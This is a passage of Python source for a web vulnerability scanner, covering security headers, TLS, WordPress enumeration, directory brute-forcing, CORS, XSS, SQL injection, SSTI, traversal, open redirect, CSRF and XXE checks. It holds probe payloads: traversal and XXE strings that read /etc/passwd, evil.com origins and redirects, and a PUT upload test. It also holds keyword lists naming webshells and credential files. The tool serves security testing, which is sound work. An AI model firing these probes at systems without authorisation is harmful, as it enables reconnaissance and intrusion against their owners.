                    info["whatweb"] = out
                    print(f"    {C.GRN}WhatWeb:{C.R} {out[:120]}")
            except Exception:
                pass

        self.report.info.update(info)
        return info


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: SECURITY HEADERS
# ══════════════════════════════════════════════════════════════════════════════

class HeadersAnalyser:
    def __init__(self, url, sess: Session, report: Report):
        self.url    = url
        self.sess   = sess
        self.report = report

    def run(self):
        _status("Security headers analysis")
        r = self.sess.get(self.url)
        if not r:
            return
        hl = {k.lower(): v for k, v in r.headers.items()}

        for hdr, meta in SECURITY_HEADERS.items():
            if hdr.lower() not in hl:
                self.report.add(Vuln(
                    name=f"Missing security header: {hdr}",
                    severity=meta["sev"],
                    desc=meta["desc"],
                    component=self.url,
                    evidence=f"Header '{hdr}' absent",
                    fix=f"Add response header: {meta['fix']}",
                    refs=[meta["ref"]]
                ))

        # HSTS max-age too short
        hsts = hl.get("strict-transport-security","")
        if hsts:
            m = re.search(r"max-age=(\d+)", hsts)
            if m and int(m.group(1)) < 31536000:
                self.report.add(Vuln(
                    name="HSTS max-age too short (< 1 year)",
                    severity="Low",
                    desc=f"max-age={m.group(1)}s is less than 1 year, weakening protection.",
                    component=self.url, evidence=f"HSTS: {hsts}",
                    fix="Set max-age to at least 31536000.",refs=["https://hstspreload.org/"]
                ))

        # Weak CSP
        csp = hl.get("content-security-policy","")
        if csp:
            issues = []
            if "unsafe-inline" in csp: issues.append("'unsafe-inline'")
            if "unsafe-eval"   in csp: issues.append("'unsafe-eval'")
            if re.search(r"(?:default|script)-src[^;]*\*",csp): issues.append("wildcard source")
            if issues:
                self.report.add(Vuln(
                    name=f"Weak CSP directives: {', '.join(issues)}",
                    severity="Medium",
                    desc="Content-Security-Policy contains directives that weaken XSS protection.",
                    component=self.url, evidence=f"CSP: {csp[:200]}",
                    fix="Remove 'unsafe-inline', 'unsafe-eval' and wildcard sources from CSP.",
                    refs=["https://content-security-policy.com/"]
                ))

        # Insecure cookies
        for ck in r.cookies:
            issues = []
            if not ck.secure:            issues.append("missing Secure")
            if not ck.has_nonstandard_attr("HttpOnly"): issues.append("missing HttpOnly")
            if not ck.has_nonstandard_attr("SameSite"): issues.append("missing SameSite")
            if issues:
                self.report.add(Vuln(
                    name=f"Insecure cookie: {ck.name}",
                    severity="Medium",
                    desc=f"Cookie '{ck.name}': {', '.join(issues)}.",
                    component=self.url, evidence=f"Cookie: {ck.name}",
                    fix="Set cookie flags: Secure; HttpOnly; SameSite=Strict",
                    refs=["https://owasp.org/www-community/controls/SecureCookieAttribute"]
                ))

        # Cache-Control for sensitive pages
        cc = hl.get("cache-control","")
        if "no-store" not in cc and "no-cache" not in cc:
            self.report.add(Vuln(
                name="Missing Cache-Control: no-store",
                severity="Info",
                desc="Responses may be cached by browsers/proxies, risking sensitive data exposure.",
                component=self.url, evidence=f"Cache-Control: {cc or '(absent)'}",
                fix="Add: Cache-Control: no-store, no-cache, must-revalidate",
            ))

        # X-Powered-By (duplicate check for completeness)
        # Server information in Error pages — probe non-existent path
        r404 = self.sess.get(urljoin(self.url+"/","_thispagedoesnotexist_xyz_12345"))
        if r404 and r404.status_code == 200:
            self.report.add(Vuln(
                name="Custom 404 not configured (soft 404)",
                severity="Info",
                desc="Server returns HTTP 200 for non-existent pages. Can hinder security tooling.",
                component=self.url+"/_thispagedoesnotexist_xyz_12345",
                fix="Configure a proper 404 error handler returning HTTP 404.",
            ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: SSL/TLS
# ══════════════════════════════════════════════════════════════════════════════

class SSLAnalyser:
    def __init__(self, url, report: Report):
        self.url    = url
        self.report = report
        p           = urlparse(url)
        self.host   = p.hostname or ""
        self.port   = p.port or (443 if p.scheme=="https" else 80)
        self.https  = p.scheme == "https"

    def _basic(self):
        if not self.https:
            self.report.add(Vuln(
                name="Site not served over HTTPS",
                severity="High",
                desc="All data is transmitted in cleartext over HTTP.",
                component=self.url,
                fix="Obtain a TLS certificate (Let's Encrypt) and redirect HTTP→HTTPS.",
                refs=["https://letsencrypt.org/"]
            ))
            return

        ctx = ssl.create_default_context()
        try:
            with ctx.wrap_socket(socket.socket(), server_hostname=self.host) as s:
                s.settimeout(10)
                s.connect((self.host, self.port))
                cert  = s.getpeercert()
                proto = s.version()

                # Expiry
                na = cert.get("notAfter","")
                if na:
                    try:
                        exp = datetime.datetime.strptime(na, "%b %d %H:%M:%S %Y %Z")
                        days = (exp - datetime.datetime.utcnow()).days
                        self.report.info["ssl_days_left"] = days
                        if days < 0:
                            self.report.add(Vuln("TLS certificate EXPIRED","Critical",
                                f"Cert expired {abs(days)}d ago.",self.host,fix="Renew immediately."))
                        elif days < 14:
                            self.report.add(Vuln("TLS certificate expiring in < 14 days","High",
                                f"Expires in {days} days.",self.host,fix="Renew now."))
                        elif days < 30:
                            self.report.add(Vuln("TLS certificate expiring soon","Medium",
                                f"Expires in {days} days.",self.host,fix="Schedule renewal."))
                    except Exception: pass

                # Weak protocol
                if proto in ("SSLv2","SSLv3","TLSv1","TLSv1.1"):
                    self.report.add(Vuln(
                        name=f"Deprecated TLS/SSL protocol: {proto}",
                        severity="High",
                        desc=f"Server negotiated {proto} which is cryptographically broken.",
                        component=self.host,
                        fix="Disable all versions < TLS 1.2. Prefer TLS 1.3.",
                        refs=["https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=POODLE"]
                    ))

                self.report.info["ssl_proto"] = proto

                # Subject Alt Names / wildcard
                san = dict(cert).get("subjectAltName",[])
                wildcards = [v for t,v in san if t=="DNS" and v.startswith("*.")]
                if wildcards:
                    self.report.info["ssl_wildcards"] = wildcards

        except ssl.SSLCertVerificationError as e:
            self.report.add(Vuln(
                name="Invalid/self-signed TLS certificate",
                severity="High",
                desc=f"SSL verification failed: {e}",
                component=self.host,
                fix="Install a certificate from a trusted CA.",
                refs=["https://letsencrypt.org/"]
            ))
        except ssl.SSLError as e:
            # Try with permissive context to check if server is even TLS
            try:
                ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx2.check_hostname = False
                ctx2.verify_mode    = ssl.CERT_NONE
                with ctx2.wrap_socket(socket.socket(), server_hostname=self.host) as s2:
                    s2.settimeout(10)
                    s2.connect((self.host, self.port))
                    proto = s2.version()
                    self.report.add(Vuln(
                        name=f"TLS handshake only succeeded with permissive client — {proto}",
                        severity="Medium",
                        desc="Server TLS configuration requires non-default client settings.",
                        component=self.host,
                        fix="Use a standard TLS 1.2+ configuration.",
                    ))
            except Exception:
                self.report.err(f"SSL check failed: {e}")
        except Exception as e:
            self.report.err(f"SSL probe error: {e}")

    def run(self):
        _status("SSL/TLS analysis")
        testssl = shutil.which("testssl.sh") or shutil.which("testssl")
        if testssl:
            try:
                out = subprocess.run(
                    [testssl,"--quiet","--color","0","--fast",self.url],
                    capture_output=True, text=True, timeout=120
                ).stdout
                for line in out.splitlines():
                    if any(w in line for w in ("VULNERABLE","CRITICAL","HIGH","WARN")):
                        cves = re.findall(r"CVE-\d{4}-\d+", line)
                        self.report.add(Vuln(
                            name=f"testssl.sh: {line[:80]}",
                            severity="High",
                            desc=line.strip(),
                            component=self.host,
                            fix="Apply vendor recommended TLS hardening.",
                            refs=["https://testssl.sh/"],cves=cves
                        ))
                return
            except subprocess.TimeoutExpired:
                self.report.err("testssl.sh timed out")
            except Exception as e:
                self.report.err(f"testssl.sh: {e}")
        self._basic()


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: CMS DETECTION
# ══════════════════════════════════════════════════════════════════════════════

class CMSDetector:
    def __init__(self, url, sess: Session, report: Report):
        self.url    = url
        self.sess   = sess
        self.report = report

    def _wp_checks(self):
        # Version from readme
        r = self.sess.get(urljoin(self.url+"/","readme.html"))
        if r and "wordpress" in r.text.lower():
            m = re.search(r"[Vv]ersion\s+([\d.]+)", r.text)
            if m:
                ver = m.group(1)
                self.report.info["wp_version"] = ver
                self.report.add(Vuln(
                    name=f"WordPress version disclosed: {ver}",
                    severity="Low",
                    desc="readme.html reveals WP version; aids CVE targeting.",
                    component=urljoin(self.url+"/","readme.html"),
                    evidence=f"Version: {ver}",
                    fix="Delete readme.html from the web root.",
                    refs=["https://wpscan.com/"]
                ))

        # XML-RPC
        r2 = self.sess.post(
            urljoin(self.url+"/","xmlrpc.php"),
            data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
            headers={"Content-Type":"text/xml"}
        )
        if r2 and r2.status_code == 200 and "methodResponse" in r2.text:
            self.report.add(Vuln(
                name="WordPress XML-RPC enabled",
                severity="Medium",
                desc="xmlrpc.php is enabled — abusable for credential brute-force "
                     "(amplified via system.multicall) and DDoS amplification.",
                component=urljoin(self.url+"/","xmlrpc.php"),
                fix="Disable XML-RPC unless required. Use plugin like Wordfence.",
                refs=["https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/"]
            ))

        # User enumeration
        r3 = self.sess.get(self.url+"/?author=1", allow_redirects=True)
        if r3 and "/author/" in r3.url:
            uname = r3.url.rstrip("/").split("/")[-1]
            self.report.add(Vuln(
                name="WordPress user enumeration via /?author=1",
                severity="Medium",
                desc=f"Username '{uname}' discovered via author parameter redirect.",
                component=self.url+"/?author=1", evidence=f"Redirect → {r3.url}",
                fix="Block /wp-json/wp/v2/users and ?author= enumeration via .htaccess or plugin.",
            ))

        # REST API user enumeration
        r4 = self.sess.get(urljoin(self.url+"/","wp-json/wp/v2/users"))
        if r4 and r4.status_code == 200:
            try:
                users = r4.json()
                names = [u.get("name","?") for u in users[:5]] if isinstance(users,list) else []
                self.report.add(Vuln(
                    name="WordPress REST API exposes user list",
                    severity="Medium",
                    desc=f"wp-json/wp/v2/users returns user data: {names}",
                    component=urljoin(self.url+"/","wp-json/wp/v2/users"),
                    evidence=str(names),
                    fix="Restrict REST API user endpoint or require authentication.",
                ))
            except Exception: pass

        # Debug log
        r5 = self.sess.get(urljoin(self.url+"/","wp-content/debug.log"))
        if r5 and r5.status_code == 200 and len(r5.text) > 50:
            self.report.add(Vuln(
                name="WordPress debug.log publicly accessible",
                severity="High",
                desc="wp-content/debug.log is publicly readable and may contain "
                     "sensitive paths, credentials, or error details.",
                component=urljoin(self.url+"/","wp-content/debug.log"),
                evidence=r5.text[:200],
                fix="Delete debug.log and set WP_DEBUG_LOG to false in wp-config.php.",
            ))

    def run(self) -> Optional[str]:
        _status("CMS detection")
        r = self.sess.get(self.url)
        if not r:
            return None
        html_lower = r.text.lower()
        hl         = {k.lower():v for k,v in r.headers.items()}

        for cms, sigs in CMS_SIGS.items():
            hit = any(s.lower() in html_lower for s in sigs["body"])
            if not hit:
                hit = any(p.lower() in hl.get("x-generator","").lower() for p in sigs["body"])
            if not hit and BS4_OK:
                soup = BeautifulSoup(r.text,"html.parser")
                gm   = soup.find("meta",attrs={"name":re.compile("generator",re.I)})
                if gm and any(s.lower() in (gm.get("content","")).lower() for s in sigs["body"]):
                    hit = True
            if hit:
                self.report.cms = cms
                self.report.info["cms"] = cms
                self.report.add(Vuln(
                    name=f"CMS detected: {cms}",
                    severity="Info",
                    desc=f"Site uses {cms}. Ensure it and all plugins are fully patched.",
                    component=self.url,
                    fix=f"Keep {cms} updated. Subscribe to security advisories.",
                    refs=["https://cve.mitre.org/"]
                ))
                if cms == "WordPress":
                    self._wp_checks()
                return cms
        return None


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: ROBOTS.TXT & SITEMAP
# ══════════════════════════════════════════════════════════════════════════════

class RobotsAnalyser:
    def __init__(self, url, sess: Session, report: Report):
        self.url    = url
        self.sess   = sess
        self.report = report

    def run(self):
        _status("robots.txt / sitemap analysis")
        r = self.sess.get(urljoin(self.url+"/","robots.txt"))
        if r and r.status_code == 200 and "disallow" in r.text.lower():
            disallows = re.findall(r"[Dd]isallow:\s*(\S+)", r.text)
            sensitive = [d for d in disallows if any(
                kw in d.lower() for kw in
                ["admin","backup","config","private","secret","password","db","sql","api","hidden"]
            )]
            self.report.info["robots_disallow"] = disallows[:30]
            if sensitive:
                self.report.add(Vuln(
                    name="robots.txt discloses sensitive paths",
                    severity="Low",
                    desc=f"robots.txt hints at sensitive directories: {sensitive[:10]}",
                    component=urljoin(self.url+"/","robots.txt"),
                    evidence="\n".join(sensitive[:10]),
                    fix="Avoid listing sensitive paths in robots.txt; attackers read it too.",
                ))
            else:
                self.report.add(Vuln(
                    name="robots.txt found",
                    severity="Info",
                    desc=f"Disallowed paths: {disallows[:10]}",
                    component=urljoin(self.url+"/","robots.txt"),
                ))

        # Sitemap
        for sm_path in ("sitemap.xml","sitemap_index.xml"):
            r2 = self.sess.get(urljoin(self.url+"/",sm_path))
            if r2 and r2.status_code == 200 and "xml" in r2.headers.get("content-type",""):
                urls = re.findall(r"<loc>(.*?)</loc>", r2.text)
                self.report.info["sitemap_urls"] = len(urls)
                self.report.add(Vuln(
                    name=f"sitemap.xml found ({len(urls)} URLs)",
                    severity="Info",
                    desc="Sitemap provides a full URL inventory which assists reconnaissance.",
                    component=urljoin(self.url+"/",sm_path),
                ))
                break


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: DIRECTORY ENUMERATION
# ══════════════════════════════════════════════════════════════════════════════

class DirEnum:
    def __init__(self, url, sess: Session, report: Report, fast=False):
        self.url    = url
        self.sess   = sess
        self.report = report
        self.fast   = fast

    def run(self) -> List[str]:
        _status("Directory/file enumeration")
        wordlist = DIR_WORDLIST[:40] if self.fast else DIR_WORDLIST
        found    = []

        def probe(path):
            target = self.url.rstrip("/") + "/" + path.lstrip("/")
            r = self.sess.get(target, allow_redirects=False,
                              timeout=FAST_TIMEOUT if self.fast else TIMEOUT)
            if r and r.status_code in (200,201,301,302,307,308,403,405):
                return (target, r.status_code, len(r.content))
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
            results = list(ex.map(probe, wordlist))

        for res in results:
            if not res: continue
            url_found, status, size = res
            path = url_found.replace(self.url,"")
            found.append(url_found)

            sev = "Info"
            if any(kw in path.lower() for kw in
                   [".env","wp-config","config.php","config.yml","db.sql",
                    "backup","shell","webshell","c99","r57",".git",".svn"]):
                sev = "Critical"
            elif any(kw in path.lower() for kw in
                     ["admin","phpinfo","xmlrpc","debug","error_log"]):
                sev = "High"
            elif any(kw in path.lower() for kw in
                     ["readme","changelog","license","composer","package.json"]):
                sev = "Low"

            self.report.add(Vuln(
                name=f"Exposed path: {path} [HTTP {status}]",
                severity=sev,
                desc=f"'{path}' is accessible (HTTP {status}, {size} bytes)."
                     + (" This may expose sensitive data." if sev in ("Critical","High") else ""),
                component=url_found,
                evidence=f"HTTP {status} | size={size}b",
                fix="Restrict access via web server config or remove file if not needed.",
                refs=["https://owasp.org/www-project-top-ten/"]
            ))
        return found


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: JS SECRET SCANNING
# ══════════════════════════════════════════════════════════════════════════════

class JSScanner:
    def __init__(self, url, sess: Session, report: Report):
        self.url    = url
        self.sess   = sess
        self.report = report

    def run(self):
        _status("JavaScript secret scanning")
        r = self.sess.get(self.url)
        if not r or not BS4_OK:
            return

        soup    = BeautifulSoup(r.text, "html.parser")
        js_urls = set()

        for s in soup.find_all("script"):
            src = s.get("src","")
            if src:
                full = urljoin(self.url+"/", src)
                # Only scan same-origin scripts
                if urlparse(full).netloc == urlparse(self.url).netloc:
                    js_urls.add(full)
            # Also scan inline scripts
            if s.string:
                self._scan_content(s.string, self.url+"(inline)")

        for js_url in list(js_urls)[:20]:    # cap at 20 JS files
            js_r = self.sess.get(js_url, timeout=FAST_TIMEOUT)
            if js_r and js_r.status_code == 200:
                self._scan_content(js_r.text, js_url)

    def _scan_content(self, content: str, source: str):
        for pattern, kind in JS_SECRET_PATTERNS:
            for match in re.finditer(pattern, content):
                secret_val = match.group(0)[:80]
                # Skip obvious placeholders
                if any(ph in secret_val.lower() for ph in
                       ["your_","example","placeholder","xxxx","changeme","todo"]):
                    continue
                self.report.add(Vuln(
                    name=f"Potential {kind} in JavaScript",
                    severity="High",
                    desc=f"A {kind} pattern was found in client-side JavaScript code.",
                    component=source,
                    evidence=secret_val,
                    fix="Never embed secrets in client-side code. Use server-side env vars.",
                    refs=["https://owasp.org/www-community/vulnerabilities/Hardcoded_Password"]
                ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: CORS MISCONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════

class CORSChecker:
    def __init__(self, url, sess: Session, report: Report):
        self.url    = url
        self.sess   = sess
        self.report = report

    def run(self):
        _status("CORS misconfiguration check")
        test_origins = [
            "https://evil.com",
            "null",
            self.url.replace("https://","https://evil.").replace("http://","http://evil."),
            "https://" + urlparse(self.url).hostname + ".evil.com",
        ]
        for origin in test_origins:
            r = self.sess.get(self.url, headers={"Origin": origin})
            if not r: continue
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","")

            if acao == "*":
                self.report.add(Vuln(
                    name="CORS: Wildcard Access-Control-Allow-Origin",
                    severity="Medium",
                    desc="Server returns 'Access-Control-Allow-Origin: *', "
                         "allowing any site to read responses.",
                    component=self.url, evidence=f"ACAO: {acao}",
                    fix="Restrict CORS to specific trusted origins.",
                    refs=["https://portswigger.net/web-security/cors"]
                ))
                break

            if acao == origin and acac.lower() == "true":
                self.report.add(Vuln(
                    name="CORS: Arbitrary origin reflected with credentials",
                    severity="High",
                    desc=f"Server reflects the attacker-supplied origin '{origin}' "
                         "and allows credentials — classic CORS misconfiguration.",
                    component=self.url,
                    evidence=f"ACAO: {acao} | ACAC: {acac}",
                    fix="Validate Origin against a whitelist. Never reflect arbitrary origins.",
                    refs=["https://portswigger.net/web-security/cors/access-control-allow-origin"]
                ))
                break

            if acao == "null":
                self.report.add(Vuln(
                    name="CORS: null origin allowed",
                    severity="Medium",
                    desc="Server trusts 'null' origin, exploitable from sandboxed iframes.",
                    component=self.url, evidence=f"ACAO: null",
                    fix="Never whitelist the null origin.",
                    refs=["https://portswigger.net/web-security/cors"]
                ))
                break


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: HTTP METHOD TAMPERING
# ══════════════════════════════════════════════════════════════════════════════

class MethodTampering:
    def __init__(self, url, sess: Session, report: Report):
        self.url    = url
        self.sess   = sess
        self.report = report

    def run(self):
        _status("HTTP method tampering")
        # TRACE — should always be disabled
        r = self.sess.raw_request(self.url, "TRACE")
        if r and r.status_code == 200 and "TRACE" in (r.text or "").upper():
            self.report.add(Vuln(
                name="HTTP TRACE method enabled (XST risk)",
                severity="Low",
                desc="HTTP TRACE is enabled. Can be used in Cross-Site Tracing attacks "
                     "to steal cookies even with HttpOnly set.",
                component=self.url, evidence=f"HTTP {r.status_code}",
                fix="Disable TRACE method: Apache: TraceEnable off | nginx: add if($request_method=TRACE){return 405;}",
                refs=["https://owasp.org/www-community/attacks/Cross_Site_Tracing"]
            ))

        # OPTIONS — enumerate allowed methods
        r2 = self.sess.options(self.url)
        if r2:
            allow = r2.headers.get("Allow","") or r2.headers.get("Public","")
            if allow:
                self.report.info["http_methods"] = allow
                dangerous_methods = [m for m in ["PUT","DELETE","PATCH","CONNECT","PROPFIND"]
                                     if m in allow]
                if dangerous_methods:
                    self.report.add(Vuln(
                        name=f"Dangerous HTTP methods allowed: {', '.join(dangerous_methods)}",
                        severity="Medium",
                        desc=f"Server advertises: Allow: {allow}",
                        component=self.url, evidence=f"Allow: {allow}",
                        fix="Restrict allowed HTTP methods to GET, POST, HEAD only.",
                        refs=["https://owasp.org/www-project-web-security-testing-guide/"]
                    ))

        # PUT — attempt to upload a harmless test file
        put_url = self.url.rstrip("/") + "/_vuln_test_put_" + hashlib.md5(
            self.url.encode()).hexdigest()[:8] + ".txt"
        r3 = self.sess.raw_request(put_url, "PUT",
                                   data="vuln_test", headers={"Content-Type":"text/plain"})
        if r3 and r3.status_code in (200,201,204):
            self.report.add(Vuln(
                name="HTTP PUT method allows file upload",
                severity="Critical",
                desc="PUT request succeeded — attacker can upload arbitrary files (webshells).",
                component=put_url, evidence=f"HTTP PUT → {r3.status_code}",
                fix="Disable PUT method in web server configuration.",
                refs=["https://owasp.org/www-project-web-security-testing-guide/"]
            ))
            # Clean up
            self.sess.raw_request(put_url, "DELETE")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: HOST HEADER INJECTION
# ══════════════════════════════════════════════════════════════════════════════

class HostHeaderInjection:
    def __init__(self, url, sess: Session, report: Report):
        self.url    = url
        self.sess   = sess
        self.report = report

    def run(self):
        _status("Host header injection")
        evil_host = "evil.com"
        r = self.sess.get(self.url, headers={"Host": evil_host})
        if not r: return
        body = r.text.lower()
        if evil_host in body or ("location" in r.headers and
                                  evil_host in r.headers.get("location","").lower()):
            self.report.add(Vuln(
                name="HTTP Host Header injection",
                severity="High",
                desc="The application uses the Host header in output/redirects without validation. "
                     "Can be used for password reset poisoning, cache poisoning, SSRF.",
                component=self.url, evidence=f"evil.com reflected in body/Location",
                fix="Use absolute URLs from config, not from the Host header. Validate Host against a whitelist.",
                refs=["https://portswigger.net/web-security/host-header",
                      "https://owasp.org/www-project-web-security-testing-guide/"]
            ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: VULNERABILITY TESTS (XSS, SQLi, SSTI, Traversal, CSRF, XXE)
# ══════════════════════════════════════════════════════════════════════════════

class VulnTester:
    def __init__(self, url, sess: Session, report: Report, fast=False):
        self.url    = url
        self.sess   = sess
        self.report = report
        self.fast   = fast

    # ── helpers ───────────────────────────────────────────────────────────────
    def _get_forms(self, url) -> List[Dict]:
        if not BS4_OK: return []
        r = self.sess.get(url)
        if not r: return []
        soup  = BeautifulSoup(r.text,"html.parser")
        forms = []
        for f in soup.find_all("form"):
            action = urljoin(url, f.get("action",url))
            method = f.get("method","get").lower()
            inputs = {}
            for inp in f.find_all(["input","textarea","select"]):
                name = inp.get("name")
                if name:
                    inputs[name] = inp.get("value","test")
            forms.append({"action":action,"method":method,"inputs":inputs})
        return forms

    def _inject_params(self, url, payload) -> List[str]:
        """Return probing URLs with payload injected into each GET param."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            # add a generic param
            return [url + ("&" if "?" in url else "?") + "id=" + quote(payload)]
        result = []
        for key in params:
            injected = dict(params)
            injected[key] = [payload]
            from urllib.parse import urlencode as _ue
            q = _ue({k: v[0] for k,v in injected.items()})
            result.append(parsed._replace(query=q).geturl())
        return result

    # ── XSS ───────────────────────────────────────────────────────────────────
    def test_xss(self):
        _status("XSS detection")
        for payload in XSS_PAYLOADS:
            for probe_url in self._inject_params(self.url, payload):
                r = self.sess.get(probe_url)
                if r and payload in r.text:
                    self.report.add(Vuln(
                        name="Reflected Cross-Site Scripting (XSS)",
                        severity="High",
                        desc="User input is reflected in the page without HTML encoding.",
                        component=probe_url, evidence=f"Payload reflected: {payload[:80]}",
                        fix="HTML-encode all user-supplied output. Implement strict CSP.",
                        refs=["https://owasp.org/www-community/attacks/xss/","CWE-79"]
                    ))
                    return   # one finding is enough

        # Form-based XSS
        for form in self._get_forms(self.url)[:3]:
            for payload in XSS_PAYLOADS[:3]:
                data = {k: payload for k in form["inputs"]}
                r = (self.sess.post(form["action"],data=data)
                     if form["method"]=="post"
                     else self.sess.get(form["action"],params=data))
                if r and payload in (r.text or ""):
                    self.report.add(Vuln(
                        name="Reflected XSS via form input",
                        severity="High",
                        desc="Form input is reflected without encoding.",
                        component=form["action"], evidence=f"Payload: {payload[:80]}",
                        fix="Encode output. Use CSP.",
                        refs=["CWE-79"]
                    ))
                    return

    # ── SQL Injection (error-based) ───────────────────────────────────────────
    def test_sqli_error(self):
        _status("SQL injection (error-based)")
        for payload in SQLI_PAYLOADS:
            for probe_url in self._inject_params(self.url, payload):
                r = self.sess.get(probe_url)
                if not r: continue
                body = r.text.lower()
                for err in SQL_ERRORS:
                    if err in body:
                        self.report.add(Vuln(
                            name="SQL Injection — error-based",
                            severity="Critical",
                            desc="Application returns raw SQL error messages, confirming unsanitised input.",
                            component=probe_url,
                            evidence=f"Payload: {payload} | Error: {err}",
                            fix="Use prepared statements/parameterised queries. Never expose DB errors.",
                            refs=["https://owasp.org/www-community/attacks/SQL_Injection","CWE-89"]
                        ))
                        return

        # Form-based
        for form in self._get_forms(self.url)[:3]:
            for payload in SQLI_PAYLOADS[:4]:
                data = {k: payload for k in form["inputs"]}
                r = (self.sess.post(form["action"],data=data)
                     if form["method"]=="post"
                     else self.sess.get(form["action"],params=data))
                if r:
                    body = (r.text or "").lower()
                    for err in SQL_ERRORS:
                        if err in body:
                            self.report.add(Vuln(
                                name="SQL Injection via form — error-based",
                                severity="Critical",
                                desc="SQL error triggered via form submission.",
                                component=form["action"],
                                evidence=f"Payload: {payload} | Error hint: {err}",
                                fix="Use prepared statements.",
                                refs=["CWE-89"]
                            ))
                            return

    # ── Blind Time-based SQLi ─────────────────────────────────────────────────
    def test_sqli_time(self):
        if self.fast: return
        _status("SQL injection (time-based blind)")
        baseline_times = []
        for _ in range(2):
            t0 = time.time()
            self.sess.get(self.url)
            baseline_times.append(time.time()-t0)
        baseline = sum(baseline_times)/len(baseline_times) + 1.5  # +1.5s threshold

        for payload, sleep_sec, db_hint in SQLI_TIME_PAYLOADS:
            for probe_url in self._inject_params(self.url, payload):
                t0 = time.time()
                self.sess.get(probe_url, timeout=sleep_sec+6)
                elapsed = time.time()-t0
                if elapsed >= (baseline + sleep_sec - 0.5):
                    self.report.add(Vuln(
                        name=f"SQL Injection — time-based blind ({db_hint})",
                        severity="Critical",
                        desc=f"Response delayed {elapsed:.1f}s with payload '{payload}'. "
                             f"Indicates {db_hint} time-based blind SQLi.",
                        component=probe_url,
                        evidence=f"Elapsed: {elapsed:.1f}s (baseline: {baseline:.1f}s)",
                        fix="Use prepared statements. Audit all DB queries.",
                        refs=["https://owasp.org/www-community/attacks/Blind_SQL_Injection","CWE-89"]
                    ))
                    return

    # ── SSTI ─────────────────────────────────────────────────────────────────
    def test_ssti(self):
        _status("Server-Side Template Injection (SSTI)")
        for payload, expected, engine in SSTI_PAYLOADS:
            for probe_url in self._inject_params(self.url, payload):
                r = self.sess.get(probe_url)
                if r and expected in (r.text or ""):
                    self.report.add(Vuln(
                        name=f"Server-Side Template Injection ({engine})",
                        severity="Critical",
                        desc=f"Template expression {payload!r} evaluated to '{expected}'. "
                             "SSTI can lead to Remote Code Execution.",
                        component=probe_url, evidence=f"{payload} → {expected}",
                        fix="Never pass user input directly into template rendering functions.",
                        refs=["https://portswigger.net/research/server-side-template-injection","CWE-94"]
                    ))
                    return

    # ── Directory Traversal ───────────────────────────────────────────────────
    def test_traversal(self):
        _status("Directory traversal")
        payloads = [
            "../../../../etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        # Windows targets
        win_payloads = [
            "..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        ]
        for params in [["file","path","page","include","doc","template","load","read"]]:
            for p in params:
                for payload in payloads + win_payloads:
                    probe = f"{self.url}?{p}={payload}"
                    r = self.sess.get(probe)
                    if r:
                        if "root:" in r.text or "[fonts]" in r.text.lower():
                            self.report.add(Vuln(
                                name="Path Traversal / Directory Traversal",
                                severity="Critical",
                                desc=f"Parameter '{p}' allows reading arbitrary files.",
                                component=probe, evidence=r.text[:200],
                                fix="Validate paths with realpath(). Use allowlist for permitted files.",
                                refs=["https://owasp.org/www-community/attacks/Path_Traversal","CWE-22"]
                            ))
                            return

    # ── Open Redirect ─────────────────────────────────────────────────────────
    def test_open_redirect(self):
        _status("Open redirect")
        payloads = ["https://evil.com","//evil.com","/\\evil.com",
                    "https:///evil.com","https://evil.com%2F@" + (urlparse(self.url).hostname or "")]
        for param in ["redirect","url","next","return","return_url","goto","redir","dest","target","link"]:
            for payload in payloads:
                probe = f"{self.url}?{param}={quote(payload)}"
                r = self.sess.get(probe, allow_redirects=False)
                if r and r.status_code in (301,302,307,308):
                    loc = r.headers.get("Location","")
                    if "evil.com" in loc:
                        self.report.add(Vuln(
                            name="Open Redirect",
                            severity="Medium",
                            desc=f"Parameter '{param}' redirects to external attacker-controlled URL.",
                            component=probe, evidence=f"Location: {loc}",
                            fix="Validate redirect destinations against an allowlist of known-safe URLs.",
                            refs=["https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html","CWE-601"]
                        ))
                        return

    # ── CSRF ──────────────────────────────────────────────────────────────────
    def test_csrf(self):
        _status("CSRF detection")
        csrf_names = {"csrf","_csrf","csrf_token","token","_token",
                      "csrfmiddlewaretoken","authenticity_token","nonce","__requestverificationtoken"}
        for form in self._get_forms(self.url)[:5]:
            if form["method"] == "post":
                has_csrf = any(k.lower() in csrf_names for k in form["inputs"])
                if not has_csrf:
                    self.report.add(Vuln(
                        name="CSRF — no token in POST form",
                        severity="Medium",
                        desc=f"POST form at {form['action']} lacks a CSRF token.",
                        component=form["action"],
                        fix="Add a cryptographically random per-session CSRF token to all state-changing forms.",
                        refs=["https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html","CWE-352"]
                    ))

    # ── XXE Probe ─────────────────────────────────────────────────────────────
    def test_xxe(self):
        _status("XXE probe")
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><value>&xxe;</value></data>"""
        # Find JSON/XML endpoints
        for path in ["/api","/api/v1","/graphql","/service","/upload","/"]:
